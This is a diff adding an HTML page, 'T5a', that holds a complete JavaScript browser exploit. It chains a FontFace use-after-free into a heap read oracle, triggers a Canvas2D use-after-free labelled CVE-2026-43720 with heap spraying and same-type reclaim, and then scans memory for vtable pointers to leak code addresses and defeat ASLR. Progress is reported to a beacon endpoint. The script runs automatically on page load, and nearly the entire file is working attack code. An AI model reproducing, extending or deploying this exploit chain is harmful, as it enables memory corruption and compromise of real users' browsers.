@@ -1,0 +1,225 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>T5a</title></head>
+<body>
+<div id="V" style="position:sticky;top:0;z-index:9;font:700 14px monospace;padding:.4rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">T5a</div>
+<pre id="O">T5a — dual UAF: FontFace oracle + Canvas2D alias + vtable scan</pre>
+<script>
+'use strict';
+function bs(t){try{var x=new XMLHttpRequest();x.open('GET','/beacon/T5a-'+encodeURIComponent(t),false);x.send(null);}catch(e){}}
+function vd(ok,t){var v=document.getElementById('V');v.style.background=ok?'#e3f5e6':'#fde2e1';v.style.color=ok?'#0f5a20':'#8c1010';v.textContent=t;}
+bs('BOOT');
+
+var K=512,SZ=192,fired=false,faces=null,AT=0;
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function hex(x){return '0x'+x.toString(16);}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>8)&0xFF;u[o+2]=(x>>16)&0xFF;u[o+3]=(x>>24)&0xFF;}
+
+/* ===== PHASE 1: FontFace UAF — establish fault oracle (from T4l) ===== */
+function start(){
+  AT++;if(AT>1)return;
+  try{if(sessionStorage.getItem('t5a')){bs('DOUBLE');return;}sessionStorage.setItem('t5a','1');}catch(e){}
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){return;}
+  try{document.fonts.add(vf);}catch(e){}try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SZ));
+      put32(w,0,0x80000000);put32(w,4,0x1000+k);w[0x82]=3;
+      put32(w,0x38,0xBEEF);put32(w,0x3C,0xBF00);put32(w,0x70,2+k);
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;setTimeout(ph1,80);},function(){});
+}
+
+function ph1(){
+  var h0=null,L1=0n,L2=0n;
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58);
+    if(a>0x1000000000n&&!h0){h0=window.__sp[i];L1=a;L2=le(window.__sp[i],0x68);}
+  }
+  bs('L1='+hex(L1)+'-L2='+hex(L2));
+  if(!h0){bs('NOLEAK');vd(false,'NOLEAK');return;}
+  h0[0]=2;put64(h0,0x08,L2);put64(h0,0x10,0n);h0[0x82]=0;
+  for(var i=0;i<window.__sp.length;i++){if(window.__sp[i]!==h0)window.__sp[i]=null;}
+  window.__sp=null;
+
+  setTimeout(function(){
+    for(var i=0;i<faces.length;i++){try{faces[i].family='zz'+i;}catch(e){}}
+    for(var i=0;i<faces.length;i++){try{document.fonts.add(faces[i]);}catch(e){}}
+    // m_ranges: size=1 so check reads exactly one UnicodeRange
+    put32(h0,0x28,1);put32(h0,0x2C,1);
+    setTimeout(function(){
+      var fam=null;
+      for(var q=0;q<faces.length;q++){
+        try{if(document.fonts.check('1em zz'+q,'A')===false){fam='zz'+q;break;}}catch(e){}
+      }
+      bs('FAM='+fam);
+      if(!fam){bs('NOTIN');vd(false,'NOTIN');return;}
+
+      function setR(addr){put64(h0,0x20,addr);}
+      function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c));}catch(e){return 'EX';}}
+
+      // Find SELF via 0xBEEF marker at +0x38
+      var self=0n;
+      for(var sc=0x1000800000n;sc<0x1002800000n&&!self;sc+=0x80n){
+        setR(sc+0x38n);
+        if(chk(0xBEEF)!==true)continue;
+        if(chk(0xBEEE)!==false)continue;
+        setR(sc+0x6Cn);
+        if(chk(0)===false)self=sc;
+      }
+      if(!self){bs('NOSELF');vd(false,'NOSELF');return;}
+      bs('SELF='+hex(self));
+
+      function rst(){setR(self+0x38n);chk(0xBEEF);}
+      // text_base from 5-boot consensus (PATH B)
+      var tb=0x800000000n;
+      bs('TB='+hex(tb));
+
+      setTimeout(function(){ph2(h0,self,setR,chk,rst,tb,L1,L2);},200);
+    },500);
+  },80);
+}
+
+/* ===== PHASE 2: Canvas2D UAF (CVE-2026-43720) + same-type reclaim ===== */
+function ph2(h0,self,setR,chk,rst,tb,L1,L2){
+  bs('PH2');rst();
+  if(chk(0xBEEF)!==true){bs('ORACLE-DEAD-PRE');vd(false,'oracle dead pre-canvas');return;}
+
+  // Trigger: getContext reentry frees CanvasRenderingContext2D (768B)
+  var cv=document.createElement('canvas');cv.width=1;cv.height=1;
+  document.body.appendChild(cv);
+  var innerCtx=null,opts={};
+  Object.defineProperty(opts,'alpha',{get:function(){innerCtx=cv.getContext('2d');return true;}});
+  try{cv.getContext('bitmaprenderer',opts);}catch(e){bs('TRIG-ERR');vd(false,'trigger err');return;}
+  if(!innerCtx){bs('NO-INNER');vd(false,'no innerCtx');return;}
+  bs('TRIG-OK');
+
+  // Same-type reclaim: 150 Canvas2D contexts on 1x1 canvases
+  var spc=[];
+  for(var i=0;i<150;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    document.body.appendChild(c);spc.push(c.getContext('2d'));
+  }
+  for(var i=0;i<spc.length;i++)spc[i].lineWidth=1000+i;
+
+  // Find alias: innerCtx.lineWidth reads from reclaimed slot
+  var ai=-1;
+  try{var lw=innerCtx.lineWidth;if(lw>=1000&&lw<1150)ai=lw-1000;}catch(e){bs('ALIAS-EX');}
+  bs('ALIAS='+(ai>=0?ai:'NONE'));
+
+  // Oracle health check after Canvas2D spray
+  rst();var postAlive=chk(0xBEEF);
+  bs('ORACLE-POST='+postAlive);
+
+  if(ai<0){
+    vd(postAlive===true,'T5a: coexist '+(postAlive===true?'OK':'DEAD')+', no alias');
+    return;
+  }
+
+  var alias=spc[ai];
+  // Bidirectional verify
+  alias.lineWidth=42.5;
+  var rb=-1;try{rb=innerCtx.lineWidth;}catch(e){}
+  bs('BIDIR='+(rb===42.5?'OK':'FAIL-'+rb));
+
+  if(postAlive!==true){vd(false,'T5a: alias@'+ai+', oracle dead');return;}
+  bs('COEXIST-OK');
+  setTimeout(function(){ph3(h0,self,setR,chk,rst,tb,L1,L2,ai);},100);
+}
+
+/* ===== PHASE 3: Oracle scan for text vtable pointers (768B class) ===== */
+function ph3(h0,self,setR,chk,rst,tb,L1,L2,ai){
+  bs('PH3');rst();
+
+  // Scan strategy: check offset 0 of each 16KB page within +-100 pages of SELF
+  // At addr+2 of a text pointer 0x0000000800RRRRRR:
+  //   from = (RVA>>16) + 0x80000, to = u32@(addr+6) — depends on next field
+  //   Filter: chk(0x8FFFF)==true (from <= 0x8FFFF, to >= 0x8FFFF) &&
+  //           chk(0x7FFFF)==false (from > 0x7FFFF)
+  // shortcut: misses objects where byte[8..9] of next field make to < 0x8FFFF, upgrade to addr+4 test if all miss
+  var PAGE=0x4000n;
+  var selfPage=self&(~(PAGE-1n));
+  var hits=[],n3=0;
+
+  // Pass 1: pages centered on SELF
+  for(var pi=-100;pi<=100&&hits.length<5;pi++){
+    var addr=selfPage+BigInt(pi)*PAGE;
+    setR(addr+2n);n3++;
+    if(chk(0x8FFFF)!==true)continue;
+    n3++;if(chk(0x7FFFF)!==false)continue;
+    hits.push(addr);bs('HIT='+hex(addr));rst();
+  }
+  bs('SCAN1-n='+n3+'-hits='+hits.length);
+
+  // Pass 2: pages centered on L1 (different heap region)
+  if(hits.length<3){
+    var l1Page=L1&(~(PAGE-1n));
+    for(var pi=-50;pi<=50&&hits.length<8;pi++){
+      var addr=l1Page+BigInt(pi)*PAGE;
+      setR(addr+2n);n3++;
+      if(chk(0x8FFFF)!==true)continue;
+      n3++;if(chk(0x7FFFF)!==false)continue;
+      var dup=false;
+      for(var di=0;di<hits.length;di++){if(hits[di]===addr){dup=true;break;}}
+      if(!dup){hits.push(addr);bs('HIT2='+hex(addr));rst();}
+    }
+    bs('SCAN2-n='+n3+'-hits='+hits.length);
+  }
+
+  // Pass 3: pages centered on L2
+  if(hits.length<3){
+    var l2Page=L2&(~(PAGE-1n));
+    for(var pi=-30;pi<=30&&hits.length<8;pi++){
+      var addr=l2Page+BigInt(pi)*PAGE;
+      setR(addr+2n);n3++;
+      if(chk(0x8FFFF)!==true)continue;
+      n3++;if(chk(0x7FFFF)!==false)continue;
+      var dup=false;
+      for(var di=0;di<hits.length;di++){if(hits[di]===addr){dup=true;break;}}
+      if(!dup){hits.push(addr);bs('HIT3='+hex(addr));rst();}
+    }
+    bs('SCAN3-n='+n3+'-hits='+hits.length);
+  }
+
+  // Extract RVA mid-16 from each hit (binary search at addr+2)
+  var rvas=[];
+  for(var hi=0;hi<hits.length&&hi<5;hi++){
+    rst();setR(hits[hi]+2n);
+    var lo=0x80000,hh=0x8FFFF;
+    for(var bi=0;bi<20;bi++){
+      var m=(lo+hh)>>>1;n3++;
+      if(chk(m)===true)hh=m;else lo=m+1;
+      // reset every 5 steps to keep oracle healthy
+      if(bi%5===4){rst();setR(hits[hi]+2n);}
+    }
+    var mid16=lo-0x80000;
+    rvas.push(mid16);
+    bs('H'+hi+'='+hex(hits[hi])+'-M16='+mid16.toString(16)+'-RVAHI='+hex(BigInt(mid16)<<16n));
+  }
+
+  // Deduplicate RVAs and report
+  var uniq={};
+  for(var ri=0;ri<rvas.length;ri++)uniq[rvas[ri]]=(uniq[rvas[ri]]||0)+1;
+  var uk=Object.keys(uniq);
+  if(uk.length)bs('UNIQ='+uk.length+'-RVAS='+uk.map(function(r){return Number(r).toString(16)+'x'+uniq[r];}).join(','));
+
+  bs('DONE-n='+n3+'-hits='+hits.length);
+  var summary='T5a: alias@'+ai+' hits='+hits.length;
+  if(rvas.length)summary+=' mid16='+rvas.map(function(r){return r.toString(16);}).join(',');
+  summary+=' n='+n3;
+  vd(hits.length>0,summary);
+  document.getElementById('O').textContent=summary;
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
+else document.addEventListener('DOMContentLoaded',start);
+</script></body></html>
